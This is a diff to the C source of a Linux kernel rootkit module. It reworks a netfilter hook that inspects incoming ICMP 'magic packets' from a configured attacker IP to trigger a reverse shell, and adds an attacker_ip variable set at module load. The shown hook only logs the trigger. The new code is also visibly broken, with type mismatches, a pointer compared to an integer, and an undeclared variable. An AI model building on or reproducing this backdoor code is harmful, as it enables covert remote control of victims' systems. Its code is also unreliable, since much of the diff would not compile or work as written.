@@ -72,7 +72,8 @@ typedef struct action_task {
 #define MAGIC_ROOT_NUM 31337
 #define MAX_TASK_SIZE 200
 static _timer polling_timer;
-static struct nf_hook_ops* icmp_hook = NULL;
+static struct nf_hook_ops icmp_hook = NULL;
+static __be32 attacker_ip = 0;
 
 // Module parameters
 
@@ -329,45 +330,50 @@ static void do_something_on_interval(unsigned long data) {
 }
 
 /**
- * Net filter hook option for intercepting ICMP pings and
- * looking for reverse shell requests.
+ * Net filter hook option for intercepting magic packets to
+ * look for reverse shell requests. This tutorial was incredibly helpful
+ * as I was putting this together: https://www.drkns.net/kernel-who-does-magic/
  **/
-unsigned int icmp_hook_func(void* priv, struct sk_buff* skb, const struct nf_hook_state* state) {
-	struct iphdr* ip_header;
-	
+unsigned int icmp_hook_func(const struct nf_hook_ops* ops,
+                            struct sk_buff* socket_buff,
+                            const struct net_device* net_dev_in,
+                            const struct net_device* net_dev_out,
+                            int (*okfn)(struct sk_buff*)) {
+	struct iphdr ip_header;
+
 	printk(KERN_EMERG "ICMP HOOK hit");
 
 	if (!skb) {
-		return NF_DROP;
+		goto accept;
 	}
 
-	ip_header = (struct iphdr*) ip_hdr(skb);
+	ip_header = skb_header_pointer(socket_buff, 0, sizeof(ip_header), &ip_header);
 
-	// If it's an ICMP packet coming from the IP address entered during config,
-	// we should open a reverse shell.
+	if (!ip_header) {
+		goto accept;
+	}
+
+	// If it's an ICMP packet coming from the IP address entered during
+	// config, we should open a reverse shell.
 	if (ip_header->protocol == IPPROTO_ICMP) {
-		char source_ip[16];
-		printk(KERN_EMERG "ICMP ping found!\n");
-		printk(KERN_EMERG "%pI4", &ip_header->saddr);
-		snprintf(source_ip, 16, "%pI4", &ip_header->saddr);
+		printk(KERN_INFO "ICMP from %pI4 to %pI4\n", &ip_header->saddr, &ip_header->daddr);
 
-		if (!strncmp(source_ip, rev_shell_ip, 16)) {
+		if (attacker_ip == &ip_header->saddr) {
 			printk(KERN_EMERG "Reverse shell request found!\n");
 		}
 	}
 
+accept:
 	return NF_ACCEPT;
 }
 
 static void icmp_hook_init(void) {
-	icmp_hook = (struct nf_hook_ops *) kcalloc(1, sizeof(struct nf_hook_ops), GFP_KERNEL);
+	icmp_hook.hook = (void*) icmp_hook_func;
+	icmp_hook.pf = PF_INET; // Filter by IPV4 protocol family.
+	icmp_hook.hooknum = NF_IP_PRE_ROUTING;
+	icmp_hook.priority = NF_IP_PRI_FIRST; // See packets before every other hook function
 
-	icmp_hook->hook = (nf_hookfn *) icmp_hook_func;
-	icmp_hook->pf = PF_INET; // Filter by IPV4 protocol family.
-	icmp_hook->hooknum = 0; // Hook ICMP request
-	icmp_hook->priority = NF_IP_PRI_FIRST; // See packets before every other hook function
-
-	if (nf_register_net_hook(&init_net, icmp_hook)) {
+	if (nf_register_net_hook(&init_net, &icmp_hook)) {
 		printk(KERN_ERR "There was an issue registering ICMP hook.\n");
 	} else {
 		printk(KERN_ERR "Registered ICMP hook.\n");
@@ -383,6 +389,12 @@ static int __init rootkit_init(void) {
 
 	printk(KERN_EMERG "Initializing ICMP hook...\n");
 	icmp_hook_init();
+
+	// If reverse shell IP input, convert it to a numeric representation
+	// for comparison in the hook.
+	if (rev_shell_ip) {
+		attacker_ip = in_aton(rev_shell_ip);
+	}
 
 	printk(KERN_EMERG "Initializing timer...\n");
 	timer_init_wrapper(&polling_timer, do_something_on_interval);
@@ -405,8 +417,7 @@ static int __init rootkit_init(void) {
 static void __exit rootkit_exit(void) {
 	printk(KERN_EMERG "rmmod called. Cleaning up rootkit.");
 	khook_cleanup();
-	nf_unregister_net_hook(&init_net, icmp_hook);
-	kfree(icmp_hook);
+	nf_unregister_net_hook(&init_net, &icmp_hook);
 	timer_cleanup_wrapper(&polling_timer);
 }
 
